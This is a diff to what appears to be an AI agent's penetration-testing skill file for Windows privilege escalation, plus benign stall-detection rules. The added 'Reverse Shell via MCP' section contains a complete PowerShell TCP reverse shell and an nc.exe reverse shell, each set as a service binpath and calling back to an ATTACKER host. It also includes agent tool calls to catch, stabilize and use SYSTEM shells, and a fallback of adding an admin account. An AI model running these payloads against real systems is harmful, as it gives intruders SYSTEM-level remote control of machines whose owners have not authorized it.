@@ -517,6 +517,29 @@ Route to **Deep Reference** for specific vendor CVEs and IPC exploitation techni
 
 ## Step 8: Escalate or Pivot
 
+### Reverse Shell via MCP
+
+When service/DLL abuse achieves SYSTEM execution, **catch the SYSTEM shell via
+the MCP shell-server** rather than relying on local admin user creation or
+interactive console access. Service restarts and DLL loads execute in a
+different session -- a reverse shell catches the SYSTEM callback directly.
+
+1. Call `start_listener(port=4444)` to prepare a catcher on the attackbox
+2. Use a reverse shell as the service binpath or DLL payload:
+   ```cmd
+   :: Service binpath modification:
+   sc config <service_name> binpath= "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('ATTACKER',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+   :: Or via nc.exe in service binpath:
+   sc config <service_name> binpath= "C:\temp\nc.exe ATTACKER PORT -e cmd.exe"
+   ```
+   For DLL hijacking, compile the DLL with a reverse shell in `DllMain`
+   (see Step 6 payloads) pointing at the shell-server listener.
+3. Call `stabilize_shell(session_id=...)` to upgrade to interactive PTY
+4. Verify the new privilege level with `send_command(session_id=..., command="whoami")`
+
+If the target lacks outbound connectivity, use the `net user` add-admin
+approach and interact through an existing session, or use a bind shell DLL.
+
 **Before routing**: Write `engagement/state.md` and append to
 `engagement/activity.md` with results so far. The next skill reads state.md
 on activation — stale state means duplicate work or missed context.
@@ -534,6 +557,45 @@ When routing, pass along: hostname, access level achieved, exploitation method u
 OS version, current mode.
 
 Update `engagement/state.md` with escalation results.
+
+## Stall Detection
+
+If you have spent **5 or more tool-calling rounds** on the same failure with
+no meaningful progress — same error, no new information, no change in output
+— **stop**.
+
+**What counts as progress:**
+- Trying a variant or alternative **documented in this skill**
+- Adjusting syntax, flags, or parameters per the Troubleshooting section
+- Gaining new diagnostic information (different error, partial success)
+
+**What does NOT count as progress:**
+- Writing custom exploit code not provided in this skill
+- Inventing workarounds using techniques from other domains
+- Retrying the same command with trivially different input
+- Compiling or transferring tools not mentioned in this skill
+
+If you find yourself writing code that isn't in this skill, you have left
+methodology. That is a stall.
+
+Do not loop. Work through failures systematically:
+1. Try each variant or alternative **once**
+2. Check the Troubleshooting section for known fixes
+3. If nothing works after 5 rounds, you are stalled
+
+**When stalled, return to the orchestrator immediately with:**
+- What was attempted (commands, variants, alternatives tried)
+- What failed and why (error messages, empty responses, timeouts)
+- Assessment: **blocked** (permanent — config, patched, missing prereq) or
+  **retry-later** (may work with different context, creds, or access)
+- Update `engagement/state.md` Blocked section before returning
+
+**Mode behavior:**
+- **Guided**: Tell the user you're stalled, present what was tried, and
+  recommend the next best path.
+- **Autonomous**: Update state.md Blocked section, return findings to the
+  orchestrator. Do not retry the same technique — the orchestrator will
+  decide whether to revisit with new context or route elsewhere.
 
 ## Troubleshooting
 
